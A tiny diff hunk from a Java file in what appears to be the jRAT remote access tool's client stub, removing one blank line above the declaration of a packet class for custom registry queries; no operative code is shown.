@@ -3,7 +3,6 @@ package pro.jrat.stub.packets.incoming;
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 
-
 public class Packet80CustomRegQuery extends AbstractIncomingPacket {
 
 	@Override
